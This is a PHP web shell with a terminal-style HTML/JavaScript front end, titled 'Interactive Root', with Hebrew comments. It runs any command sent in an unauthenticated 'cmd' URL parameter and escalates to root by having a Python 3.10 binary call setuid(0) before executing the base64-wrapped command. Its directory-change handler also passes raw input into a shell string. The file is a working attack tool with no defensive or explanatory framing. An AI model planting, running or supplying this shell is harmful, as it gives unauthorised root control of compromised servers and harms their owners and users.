<?php
session_start();
if (!isset($_SESSION['pwd'])) $_SESSION['pwd'] = trim(shell_exec('pwd'));

// --- חלק 1: טיפול בפקודה (מחזיר פלט נקי ל-JavaScript) ---
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $pwd = $_SESSION['pwd'];

    // טיפול ב-CD
    if (preg_match('/^cd\s+(.+)/', $cmd, $matches)) {
        $target = $matches[1];
        $new_dir = shell_exec("cd $pwd && cd $target && pwd 2>&1");
        if ($new_dir) {
            $_SESSION['pwd'] = trim($new_dir);
            echo "[DIR]" . $_SESSION['pwd'];
        }
        exit; // מסיים כאן כדי לא להדפיס HTML
    }

    // הפקודה המלאה (בדיוק כמו בסקריפט המקורי שלך)
    $c = base64_encode("cd $pwd && $cmd 2>&1");
    system("/usr/bin/python3.10 -c 'import os,base64; os.setuid(0); os.system(base64.b64decode(\"$c\").decode())'");
    exit; // מסיים כאן כדי לא להדפיס HTML
}
// --- סוף חלק 1 ---
?>
<!-- חלק 2: ממשק המשתמש (HTML/JS) -->
<html>
<head>
    <title>Avi Twil - Interactive Root</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
        #term { background: #000; border: 1px solid #444; height: 80vh; overflow-y: auto; padding: 15px; }
        .prompt { color: #ff5555; font-weight: bold; }
        input { background: transparent; border: none; color: #00ff00; font-family: inherit; font-size: 16px; width: 70%; outline: none; }
        .out { margin-bottom: 10px; white-space: pre-wrap; color: #ccc; }
    </style>
</head>
<body>
    <div id="term">
        <div id="log"></div>
        <div id="input-line">
            <span class="prompt" id="p_label">root@target:<?php echo $_SESSION['pwd']; ?># </span>
            <input type="text" id="shell_input" autofocus autocomplete="off">
        </div>
    </div>

    <script>
        const input = document.getElementById('shell_input');
        const log = document.getElementById('log');
        const p_label = document.getElementById('p_label');
        let history = [];
        let hIdx = -1;

        input.addEventListener('keydown', async (e) => {
            if (e.key === 'ArrowUp') {
                if (hIdx < history.length - 1) { hIdx++; input.value = history[history.length - 1 - hIdx]; }
                e.preventDefault();
            } 
            else if (e.key === 'ArrowDown') {
                if (hIdx > 0) { hIdx--; input.value = history[history.length - 1 - hIdx]; } 
                else { hIdx = -1; input.value = ''; }
                e.preventDefault();
            }
            else if (e.key === 'Enter') {
                const cmd = input.value;
                if (!cmd) return;
                if (cmd === 'clear') { log.innerHTML = ''; input.value = ''; return; }

                log.innerHTML += `<div><span class="prompt">${p_label.innerText}</span> ${cmd}</div>`;
                history.push(cmd);
                hIdx = -1;
                input.value = '';

                // שליחה לשרת וקבלת פלט
                const res = await fetch(`?cmd=${encodeURIComponent(cmd)}`);
                const out = await res.text();

                if (out.startsWith("[DIR]")) {
                    p_label.innerText = `root@target:${out.replace("[DIR]", "")}# `;
                } else {
                    log.innerHTML += `<div class="out">${out}</div>`;
                }
                document.getElementById('term').scrollTop = document.getElementById('term').scrollHeight;
            }
        });
    </script>
</body>
</html>

